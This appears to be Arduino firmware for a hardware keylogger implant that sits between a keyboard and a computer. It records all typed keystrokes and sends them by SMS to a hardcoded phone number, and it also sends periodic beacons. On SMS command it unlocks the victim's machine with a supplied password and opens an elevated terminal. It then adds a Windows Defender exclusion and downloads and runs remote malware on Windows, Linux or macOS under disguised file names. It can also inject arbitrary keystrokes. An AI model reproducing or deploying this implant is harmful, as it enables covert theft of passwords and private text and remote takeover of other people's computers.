
/* NOTE: Make sure to edit SoftwareSerial.h to change 
 *  #define _SS_MAX_RX_BUFF 64 // RX buffer size
 *  to
 *  #define _SS_MAX_RX_BUFF 256 // RX buffer size
*/
#include <SoftwareSerial.h>            
#include <Keyboard.h>                  
#include "C_USBhost.h"                

#define LEAK_PHONE_NUMBER "+14422457648"
// We need to comment the next line, #define DEBUG false won't work as expected
#define DEBUG true
// Used by Oca to debug the code with an arduino without a SIM module and without an USB host
//#define DEBUGWITHOUTSIM true
//#define DEBUGWITHOUTSIM_PAYLOAD "unlock_download##win##XXXXXXXX##https://s3.amazonaws.com/hellotesthellotesthello/hello.exe"
//#define DEBUGWITHOUTSIM_PAYLOAD "unlock_download##osx##XXXXXXXX##https://s3.amazonaws.com/hellotesthellotesthello/hello_osx"
//#define DEBUGWITHOUTSIM_PAYLOAD "unlock_download##lnx##XXXXXXXXX##https://s3.amazonaws.com/hellotesthellotesthello/hello_lin"
#define IMPLANT_NAME "Implant 1"

//C_USBhost USBhost = C_USBhost(Serial1, /*debug_state*/DEBUG);
C_USBhost USBhost = C_USBhost(Serial1, /*debug_state*/false);
SoftwareSerial SMSSERIAL(8, 9);

#define SEPARATOR "##"

#define CHAR_LIMIT 140                                
#define BAUD_RATE_SIM800L 57600                    
#define BAUD_RATE_USB_HOST_BOARD 115200             
#define BAUD_RATE_SERIAL 115200

#ifdef DEBUG
#define BEACON_TIME 1 // Time in minutes we will send a beacon to let know it's alive
#else
#define BEACON_TIME 30 // Time in minutes we will send a beacon to let know it's alive
#endif                      

unsigned long previousMillis = 0;
unsigned long previousMillisBeacon = 0;

#ifdef DEBUG
  unsigned long interval = 3000;
#else
  unsigned long interval = 60000;
#endif
byte captured_key;
//bool mutex_SMS = false;
bool pendingSMS = false;
String buffer_keystrokes = "";
unsigned int pendingLength = 0;

// Flush buffer of the SMS serial
void SMSSerialFlush(){
  while(SMSSERIAL.available() > 0){
    int byte = SMSSERIAL.read();
    Serial.print((char)byte);
  }
}   

String readResponse()
{
  delay(500);
  String res;
  int TIMEOUT = 10 *10; // wait 10 seconds
  int incomingByte  = 0;
  while (!SMSSERIAL.available()) 
  {
    delay(100);
    TIMEOUT--;
    if (TIMEOUT == 0){
#ifdef DEBUG
      Serial.println("Timeout reading response");
#endif
      return "";
    }
  }
  
  while (SMSSERIAL.available()) 
  {
    incomingByte  = SMSSERIAL.read();
    if (incomingByte == -1){ // this should never happen 
#ifdef DEBUG
      Serial.println("There is no data to read from SMSSERIAL");
#endif
      break; 
    }
#ifdef DEBUG
    Serial.write(char(incomingByte));
#endif
    res += char(incomingByte);
  }
  return res;
}

void collectDebugInfo(){
  SMSSERIAL.write("AT+CMEE=1\r\n"); //enable debug
  readResponse();
  Serial.println("--"); 
  
  SMSSERIAL.write("AT\r\n"); //Once the handshake test is successful, it will back to OK
  readResponse();
  Serial.println("--");
  
  SMSSERIAL.write("AT+CSQ\r\n"); //Signal quality test, value range is 0-31 , 31 is the best
  readResponse();
  Serial.println("--");
  
  SMSSERIAL.write("AT+CCID\r\n"); //Read SIM information to confirm whether the SIM is plugged
  readResponse();
  Serial.println("--");

  //read stored sms
  SMSSERIAL.write("AT+CMGL=\"ALL\"\r\n"); 
  readResponse();
  Serial.println("--");

  //check card is properly inserted
  SMSSERIAL.write("AT+CPIN?\r\n"); 
  String res = readResponse();

  if(res.indexOf("CPIN: READY") <= 0){
    Serial.println("The SIM card is not ready to be used. Check you inserted id correctly");
  }
}


// Returns 1 if SMS was sucessfully sent or 0 if not
void sendSMSMessage(String txt){
#ifdef DEBUGWITHOUTSIM
  Serial.println("Sending SMS: " + txt);
  return;
#endif
  //mutex_SMS = true;
  SMSSERIAL.write("AT+CMGF=1\r\n");
  delay(2);

  SMSSERIAL.write("AT+CMGS=\"" LEAK_PHONE_NUMBER "\"\r\n"); //phonenumber with land code 
  delay(2);

  SMSSERIAL.write(txt.c_str());
  delay(2);

  SMSSerialFlush();
  
  SMSSERIAL.write((char)26);
  delay(2);
}

/* Multiplatform - Press control twice just to be sure lockscreen picture is gone*/
void unlockComputer(String password){
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.releaseAll();
  //Some extra delay in case the compiuter is suspended
  delay(1000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print(password.c_str());
  delay(500);
  Keyboard.press('\n');
  Keyboard.releaseAll(); 
  // It could take some time to unlock
  delay(3000); 
}

String getValue(String data, String separator, int index)
{
  int found = 0;
  int strIndex[] = {0, -((int)separator.length())};
  int maxIndex = data.length()-1;

  for(int i=0; i<=maxIndex && found<=index; i++){
    if(data.substring(i, i+ separator.length()) == separator || i==maxIndex){
        found++;
        strIndex[0] = strIndex[1]+separator.length();
        strIndex[1] = (i == maxIndex) ? i+separator.length() : i;
    }
  }

  return found>index ? data.substring(strIndex[0], strIndex[1]) : "";
}

// It opens a terminal in Windows (7, 8, 10) it tries to open an UAC elevated cmd.exe
void openTerminalWindows(){
  //Keys:
  // Windows+R
  //  cmd.exe
  // Enter
  //Actions:
  // Windows: Opens cmd
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("cmd.exe");
  Keyboard.press('\n');
  Keyboard.releaseAll();
  delay(2000);
  
  //Keys:
  // powershell Start-Process cmd -Verb runAs && exit
  // Enter
  // LEFT + y 
  // Backspace
  // Escape
  //Actions:
  // Windows: Opens cmd with UAC elevated if admin (If not fails but we still have a cmd shell from before)
  // Linux: It writes rpowershell... to the terminal and tries to run it (Not logged in the bash history)
  Keyboard.print("powershell Start-Process cmd -Verb runAs && exit");
  Keyboard.press('\n');
  Keyboard.releaseAll();
  //Powershell needs time to load (at least in my very slow windows laptop)
  delay(5000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.press(KEY_BACKSPACE);
  Keyboard.releaseAll();
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  //It also needs time after the UAC fails
  delay(3000);
}


// It opens a terminal in Windows (7, 8, 10) and Linux (Ubuntu, 16, 18)
void openTerminalLinux(){
  //Keys:
  // Ctrl+Alt+T 
  //Actions:
  // Windows: Nothing
  // Linux: Open a terminal
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  Keyboard.releaseAll();
  delay(3000);
  //Now we are ready to execute commands in Linux :)
}

// It opens a terminal in MacOS (Mojave)
void openTerminalMacOs(){
  //Keys:
  // Win+space
  // Win+d
  // backspace
  // Win+q
  // Esc
  // Win+space
  //Action:
  // MacOs: It opens the spotlight (and ignores Command+D a very common shortcut in MacOs)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(1000);
  //Sometimes the spotlight has already some text, we delete it
  Keyboard.press(KEY_BACKSPACE);
  Keyboard.releaseAll();
  delay(1000);

  //Keys:
  // terminal.app
  // Enter
  //Actions:
  // MacOs: Open a terminal
  Keyboard.print("terminal.app");
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(3000);
}

// It opens a terminal in Windows (7, 8, 10) and Linux (Ubuntu, 16, 18)
void openTerminalWindowsLinux(){
  //Keys:
  // Win+D
  //Action:
  // Windows: It opens the desktop
  // Linux: It opens the desktop
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
  delay(1000);
  
  //Keys:
  // Ctrl+Alt+T 
  //Actions:
  // Windows: Nothing
  // Linux: Open a terminal
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  Keyboard.releaseAll();
  delay(1000);
  
  //Keys:
  // space
  // Windows+R
  //  cmd.exe
  // Enter
  // LEFT + y 
  // Backspace
  //Actions:
  // Windows: Opens cmd
  // Linux: It writes rcmd.exe to the terminal and tries to run it (Not logged in the bash history)
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(500);  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print(" cmd.exe");
  Keyboard.press('\n');
  Keyboard.releaseAll();
  delay(2000);
  
  //Keys:
  //  powershell Start-Process cmd -Verb runAs && exit
  // Enter
  // LEFT + y 
  // Backspace
  // Escape
  //Actions:
  // Windows: Opens cmd with UAC elevated if admin (If not fails but we still have a cmd shell from before)
  // Linux: It writes rpowershell... to the terminal and tries to run it (Not logged in the bash history)
  Keyboard.print(" powershell Start-Process cmd -Verb runAs && exit");
  Keyboard.press('\n');
  Keyboard.releaseAll();
  //Powershell needs time to load (at least in my very slow windows laptop)
  delay(5000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.press(KEY_BACKSPACE);
  Keyboard.releaseAll();
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(500);
  ///bin/bash ommits one character after you press ESC, so we press it again
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(2000);
}

// It opens a terminal in Windows (7, 8, 10), Linux (Ubuntu 16, 18) and MacOS (Mojave)
// It's a bit tricky and it could conflict with some custom shortcuts, so I recommends using the specific function if the OS is known.
void openTerminalMultiOs(){
  //Keys:
  // Win+space
  // Win+d
  // backspace
  // Win+q
  // Esc
  // Win+space
  //Action:
  // Window It opens the desktop
  // Linux: It opens the desktop
  // MacOs: It opens the spotlight (and ignores Command+D a very common shortcut in MacOs)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
  delay(1000);
  //Sometimes the spotlight has already some text, we delete it
  Keyboard.press(KEY_BACKSPACE);
  Keyboard.releaseAll();
  delay(1000);
  //Sometimes Win+D opens the dictionary from the spotlight in macos. We close it with this
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('q');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(1000);
  //We reopen the spotlight
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(1000);

//This doesn't work all the times, it deselect the icon but an app in the task bar gets selected, and that's worst with the next commands
  //Keys:
  // Menu key (Shift + F10)
  // R
  // ESC
  //Actions:
  // Windows: Deselects the current item in the desktop
  // Linux: Nothing
  // MacOs: Nothing
//  Keyboard.press(KEY_LEFT_SHIFT);
//  Keyboard.press(KEY_F10);
//  Keyboard.releaseAll();
//  delay(500);
//  Keyboard.press('R');
//  Keyboard.releaseAll();
//  delay(500);
//  Keyboard.press(KEY_ESC);
//  Keyboard.releaseAll();
//  delay(500);

  //Keys:
  // terminal.app
  // Enter
  //Actions:
  // Windows: Nothing
  // Linux: It tries to execute that command but it fails
  // MacOs: Open a terminal
  Keyboard.print("terminal.app");
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  //Keys:
  // Ctrl+Alt+T 
  //Actions:
  // Windows: Nothing
  // Linux: Open a terminal
  // MacOs: Nothing (We are in the terminal)
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('t');
  Keyboard.releaseAll();
  delay(1000);

  //Keys:
  // space
  // Windows+R
  //  cmd.exe
  // Enter
  //Actions:
  // Windows: Opens cmd
  // Linux: It writes rcmd.exe to the terminal and tries to run it (Not logged in the bash history)
  // MacOs: It writes cmd.exe to the terminal and tries to run it (Not logged in the bash history)
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(500);  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.print(" r");
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print(" cmd.exe");
  Keyboard.press('\n');
  Keyboard.releaseAll();
  delay(2000);
  
  //Keys:
  //  powershell Start-Process cmd -Verb runAs && exit
  // Enter
  // LEFT + y 
  // Backspace
  // Escape
  //Actions:
  // Windows: Opens cmd with UAC elevated if admin (If not fails but we still have a cmd shell from before)
  // Linux: It writes rpowershell... to the terminal and tries to run it (Not logged in the bash history)
  // MacOs: It writes powershell... to the terminal and tries to run it (Not logged in the bash history)
  Keyboard.print(" powershell Start-Process cmd -Verb runAs && exit");
  Keyboard.press('\n');
  Keyboard.releaseAll();
  //Powershell needs time to load (at least in my very slow windows laptop)
  delay(4000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.press(KEY_BACKSPACE);
  Keyboard.releaseAll();
  ///bin/bash ommits one character after you press ESC, so we press it again
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(500);
  ///bin/bash ommits one character after you press ESC, so we press it again
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(2000);

  //Now we are ready to execute commands in all OS :)
}

void downloadAndRunMalwareWindows(String url){
  // Add windows defender exception
  Keyboard.println("powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %appdata%");
  Keyboard.releaseAll(); 
  delay(3000);

  Keyboard.print("bitsadmin /transfer winupdate /download /priority foreground ");
  Keyboard.print(url);
  Keyboard.println(" %appdata%\\Microsoft\\wintask.exe && start \"\" %appdata%\\Microsoft\\wintask.exe && exit");
  Keyboard.releaseAll();
  delay(2000);        
}

void downloadAndRunMalwareLinuxMacOs(String url){
  Keyboard.print(" x=/tmp/.logCollector; wget --no-check-certificate ");
  Keyboard.print(url);
  Keyboard.println(" -O ${x}; chmod +x ${x}; nohup ${x} &");
  Keyboard.releaseAll();
  delay(1000); 
}

void exitTerminalWindowsLinux(){
  //Keys:
  // exit
  //Actions:
  // Windows: Closes the terminal
  // Linux: Closes the terminal
  // MacOs: Closes the shell but the terminal remains open
  Keyboard.println(" exit");
  Keyboard.releaseAll();
  delay(1000);
}

void exitTerminalMultiOs(){
  exitTerminalWindowsLinux();

  //Only for MacOs
  //Keys:
  // Alt+Q
  // ESC
  //Actions:
  // Windows: Nothing (Open the search bar in win8 and closes it with ESC)
  // Linux: Nothing
  // MacOs: Closes the terminal window
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('q');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
}

void lockWindowsLinux(){
  Keyboard.press(KEY_RIGHT_GUI);
  Keyboard.press('l');
  Keyboard.releaseAll(); 
  delay(1000);
}

void lockMacOs(){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('q');
  Keyboard.releaseAll();
  delay(1000);
}

void setup(){
  delay(300);                                              
  Serial.begin(BAUD_RATE_SERIAL);

  Keyboard.begin();

#ifndef DEBUGWITHOUTSIM
  SMSSERIAL.begin(BAUD_RATE_SIM800L);
  USBhost.Begin(BAUD_RATE_USB_HOST_BOARD);                   
  SMSSERIAL.write("AT\r\n");
  readResponse();

  // Selects SMS message format as text. Default format is Protocol Data Unit (PDU)
  SMSSERIAL.write("AT+CMGF=1\r\n");
  readResponse();

#ifdef DEBUG
  collectDebugInfo();
#endif

#endif //DEBUGWITHOUTSIM                                        
}

void loop(){  
  unsigned long currentMillis = millis();
  captured_key = USBhost.GetKey();    

  // Send a beacon so we know that the implant is up
  // ToDo: this can infere with payloads execution
  if (!pendingSMS && (unsigned long)((currentMillis - previousMillisBeacon)/ 60000) > BEACON_TIME){
      String msg = "Beacon - ";
      msg += IMPLANT_NAME;
#ifdef DEBUG
      Serial.println("Sending beacon");
#endif
      sendSMSMessage(msg);
      previousMillisBeacon = currentMillis;
  }

  //Normalkey capture
  if(captured_key){
    if(captured_key == 8){ // Backspace
      if(buffer_keystrokes.length() > 0){
        buffer_keystrokes = buffer_keystrokes.substring(0, buffer_keystrokes.length() - 1);
      }
    }
    else{
      buffer_keystrokes += (char)captured_key;
    }
    previousMillis = currentMillis;  
  }

  //SMS send
  if (buffer_keystrokes.length() >= CHAR_LIMIT - 1 || (unsigned long)(currentMillis - previousMillis) >= interval && buffer_keystrokes.length() > 5){
    if (!pendingSMS){
      // The buffer could hold a lot of characters from previous SMS that couldn't be sent
      String bufferToSend = "";
      if (buffer_keystrokes.length() < CHAR_LIMIT - 1){
        bufferToSend = buffer_keystrokes;
      }
      else{
        bufferToSend = buffer_keystrokes.substring(0, CHAR_LIMIT - 1);
      }
#ifdef DEBUG
      Serial.println("Trying to send message with content: " + bufferToSend);
#endif
      
      sendSMSMessage(bufferToSend);
      pendingSMS = true;
      pendingLength = bufferToSend.length();
    } 
    else{
#ifdef DEBUG
      Serial.println("There is a SMS pending to be sent...");
#endif
    }
  }

  // If there is a pending SMS we check if it was sent, if so we remove the characters sent
  if (pendingSMS){
    if (SMSSERIAL.available()){
      String res = SMSSERIAL.readString();
#ifdef DEBUG
      Serial.println("Message read from SMSSERIAL: " + res);
#endif
      if (res.indexOf("CMGS: ") > 0){
#ifdef DEBUG
        Serial.println("SMS message succesfully sent");
#endif
        pendingSMS = false;
        
        SMSSerialFlush(); // just is case there is something else in the serial
        //mutex_SMS = false; // we can now listen for commands
        
        // We removed from the buffer the characters that were sent
        buffer_keystrokes = buffer_keystrokes.substring(pendingLength);
      }
      // ToDo: We need to change ERROR for the message receive when a SMS is not sent correctly
      else if (res.indexOf("ERROR: ")){
        // The SMS couldn't be sent, we need to retry
#ifdef DEBUG
        Serial.println("Trying to send message with content: " + buffer_keystrokes.substring(0, pendingLength));
#endif
        sendSMSMessage(buffer_keystrokes.substring(0, pendingLength));
      }
    }
  }

#ifdef DEBUGWITHOUTSIM
  if (true) {
#else
  //Payload Method Make sure keyword are unique enough that subject in question wont enter them on their keyboard.
  if (!pendingSMS && SMSSERIAL.available()){
#endif

#ifdef DEBUG
    Serial.println("new SMS");
#endif

    String SMS = SMSSERIAL.readString();      
#ifdef DEBUGWITHOUTSIM
    //We wait a little bit so the OS has time to identify the keyboard
    delay(30000);
    // To simulate a real SMS:
    SMS = "+CMT: blablabla\r\n";
    SMS += DEBUGWITHOUTSIM_PAYLOAD;
#endif

    if(SMS.indexOf("+CMT: ") > -1){ // We got a command
      String SMS_text;
      // Code to remove last new line if exists
      if(SMS.charAt(SMS.length())== '\n' &&  SMS.charAt(SMS.length()-1)== '\r'){
        SMS.remove(SMS.length()-1, SMS.length());
      }
      int new_line_pos = SMS.indexOf("\r\n", 2);
      SMS_text = SMS.substring(new_line_pos +2); // +2 is bc \r\n
#ifdef DEBUG
      Serial.println("Received SMS with content:");
      Serial.println(SMS_text);
#endif
      String payload = getValue(SMS_text, SEPARATOR, 0);
  
#ifdef DEBUG
      if(payload.length() > 0){
        Serial.println("Got payload: " + payload);
      }
#endif
      
      if (payload == "unlock_download"){
        String OS = getValue(SMS_text,SEPARATOR,1);
        OS.toLowerCase();
        String password = getValue(SMS_text,SEPARATOR,2);
        String url = getValue(SMS_text,SEPARATOR,3);
        // Unlock the computer to download and execute malware
        unlockComputer(password);
        
        // Download and execute the malware
        if(OS == "win"){
          //Open a terminal with UAC elevated if possible
          openTerminalWindows();
          downloadAndRunMalwareWindows(url);
          exitTerminalWindowsLinux();
          lockWindowsLinux();
        }
        else if(OS == "lnx"){
          openTerminalLinux();
          downloadAndRunMalwareLinuxMacOs(url);
          exitTerminalWindowsLinux();
          lockWindowsLinux();
        }
        else if(OS == "osx"){
          openTerminalMacOs();
          downloadAndRunMalwareLinuxMacOs(url);
          exitTerminalMultiOs();
          lockMacOs();
        }
        else if(OS == "winlin"){
          //We don't know the OS but we suspect is windows or linux
          openTerminalWindowsLinux();
          // If it's not windows it will fail, but it would be logged in the history
          downloadAndRunMalwareWindows(url);
          downloadAndRunMalwareLinuxMacOs(url);
          exitTerminalWindowsLinux();
          lockWindowsLinux();
        }
        else if(OS == "multi"){
          //We don't know the OS
          openTerminalMultiOs();
          //We try all the payloads
          downloadAndRunMalwareWindows(url);
          downloadAndRunMalwareLinuxMacOs(url);
          //It also closes it for Windows and Linux
          exitTerminalMultiOs();
          //We try to lock all the os
          lockWindowsLinux();
          lockMacOs();
        }
        else {
          sendSMSMessage("Wrong OS sent for payload");
        }
      }
      // Manuall##press##83 72 (in hex)
      // Manual##delay##100
      // Manual##release
      else if(payload == "Manual"){        
        String action = getValue(SMS_text,SEPARATOR,1);
        String argument = getValue(SMS_text,SEPARATOR,2);
   
        if (action == "press"){
          // There can be an unlimited number of keystrokes separated by space
          int n_spaces = 0;
          for(int i=0; i<=argument.length() ;i++){
            if(argument.charAt(i) == ' '){
                n_spaces++;
            }
          }
          for(int i=0; i<=n_spaces ;i++){
              String keystroke = getValue(argument," ",i);
              Keyboard.press((int)strtol(keystroke.c_str(), 0, 16));
          }
          Keyboard.releaseAll();
        }
        else if (action == "print"){
          Keyboard.print(argument.c_str());
        }
        else if (action == "release"){
          Keyboard.releaseAll();
        }
        else if (action == "delay"){
          delay(argument.toInt());
        }
      }
      else{
  #ifdef DEBUG
        Serial.println("Unknown payload " + payload); 
  #endif
        sendSMSMessage("Unknown payload '" + payload + "'\nFull message: " + SMS_text);
      }
      // After execute a fake payload it does a long sleep
  #ifdef DEBUGWITHOUTSIM
      delay(120000);
  #endif
    }
    else {
#ifdef DEBUG
      Serial.println("Receive something that is not an SMS: " + SMS);
#endif
    }
  }
}
